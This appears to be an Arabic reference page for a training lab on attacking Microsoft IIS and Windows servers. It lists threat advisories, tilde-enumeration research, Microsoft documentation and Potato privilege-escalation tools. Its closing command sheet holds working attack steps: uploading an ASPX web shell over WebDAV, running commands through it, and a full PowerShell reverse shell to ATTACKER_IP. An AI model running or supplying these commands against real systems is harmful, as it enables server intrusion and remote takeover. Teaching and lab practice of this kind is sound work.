# المراجع والمصادر القياسية: خوادم IIS واختراق أنظمة ويندوز (Web Server Attacks - II)

---

### 1. تقارير استخبارات التهديدات والجهات المتقدمة (Threat Intelligence & APT Advisories)

* **CISA Advisory AA23-074A:**
  * **العنوان:** *Threat Actors Exploit Progress Telerik Vulnerability in U.S. Government IIS Infrastructure*
  * **الرابط:** [https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-074a)
  * **الأهمية:** توثيق ميداني لكيفية استغلال مجموعات APT لخوادم IIS عبر حقن كود خبيث داخل عملية `w3wp.exe` وتشغيل أوامر النظام لجمع المعلومات الداخلية.

* **AhnLab Security Emergency response Center (ASEC, 2023):**
  * **العنوان:** *Lazarus Group Exploiting Vulnerable IIS Web Servers for Lateral Movement*
  * **الأهمية:** تفصيل تكتيكات مجموعة لازاروس في زراعة صدفات الويب والتسلل إلى خوادم ويندوز غير المحدثة.

* **Microsoft Threat Intelligence (HAFNIUM & ProxyLogon):**
  * **المصدر:** تقارير مايكروسوفت الرسمية حول استغلال صدفات ASPX (مثل China Chopper) على خوادم IIS الخاصة بـ Exchange Server.

---

### 2. أبحاث الثغرات القياسية وبروتوكولات الويب (Vulnerability Research & RFCs)

* **أبحاث استكشاف الأسماء القصيرة عبر علامة المدة (IIS Tilde Enumeration):**
  * **الباحث:** Soroush Dalili (2012) — *Microsoft IIS Tilde Character Vulnerability / Short Name Disclosure*.
  * **ورقة العمل:** [https://soroush.secproject.com/blog/2012/06/microsoft-iis-tilde-character-vulnerabilityfeature-short-filefolder-name-disclosure/](https://soroush.secproject.com/blog/2012/06/microsoft-iis-tilde-character-vulnerabilityfeature-short-filefolder-name-disclosure/)
  * **الأداة الرسمية:** مستودع `lijiejie/IIS_shortname_Scanner` على GitHub.

* **معايير بروتوكول WebDAV (IETF RFC 4918):**
  * **الرابط:** [https://datatracker.ietf.org/doc/html/rfc4918](https://datatracker.ietf.org/doc/html/rfc4918)
  * **الوصف:** المواصفة القياسية لطرق HTTP الموسعة (PROPFIND, PUT, DELETE, MOVE, COPY, LOCK).

---

### 3. الوثائق الرسمية لشركة مايكروسوفت (Microsoft Technical Documentation)

* **معمارية IIS وإدارة أحواض التطبيقات:**
  * [Introduction to IIS Architecture (HTTP.sys, WAS, and Worker Processes)](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/introduction-to-iis-architecture)
  * [Application Pool Identities and Permissions Model](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
* **أداة إدارة نظام الملفات `fsutil 8dot3name`:**
  * [Microsoft Learn: fsutil 8dot3name command syntax and usage](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-8dot3name)
* **امتيازات ويندوز وانتحال الرموز المميزة (Token Impersonation):**
  * [Privilege Constants and SeImpersonatePrivilege](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)

---

### 4. أبحاث تصعيد الصلاحيات عبر عائلة Potato (Privilege Escalation Research)

* **PrintSpoofer (itm4n):**
  * *Abusing Impersonation Privileges on Windows 10 and Server 2019 via Print Spooler Named Pipes*.
  * المستودع: [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* **GodPotato (BeichenDream):**
  * *Universal Privilege Escalation Tool for Windows 8 to Windows Server 2022 using DCOM and RPC*.
  * المستودع: [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

---

### 5. بطاقة الأوامر السريعة للمعمل (Command Quick Reference Sheet)

```bash
# ==============================================================================
# Web Server Attacks - II (IIS & Windows) Quick Reference Sheet
# ==============================================================================

# 1. Passive Header & WebDAV Fingerprinting
curl -I http://TARGET_IP/
curl -X OPTIONS http://TARGET_IP/ -sv 2>&1 | grep -E "Allow:|DAV:"

# 2. Automated IIS 8.3 Tilde Enumeration
python3 /usr/local/share/IIS_shortname_Scanner/iis_shortname_scan.py http://TARGET_IP/

# 3. WebDAV ASPX Shell Upload via NTLM Authentication
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://TARGET_IP/webdav/cmd.aspx

# 4. Command Execution via Query Parameter
curl -s "http://TARGET_IP/webdav/cmd.aspx?cmd=whoami"
curl -s "http://TARGET_IP/webdav/cmd.aspx?cmd=whoami+/priv"

# 5. Reverse Shell Execution (Listener: nc -lvnp 443)
curl -G "http://TARGET_IP/webdav/cmd.aspx" --data-urlencode 'cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -c "$client = New-Object System.Net.Sockets.TCPClient(\"ATTACKER_IP\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'

# 6. Automated IIS Reconnaissance with Nmap NSE
nmap -p 80 --script http-methods,http-webdav-scan,http-ntlm-info TARGET_IP
```
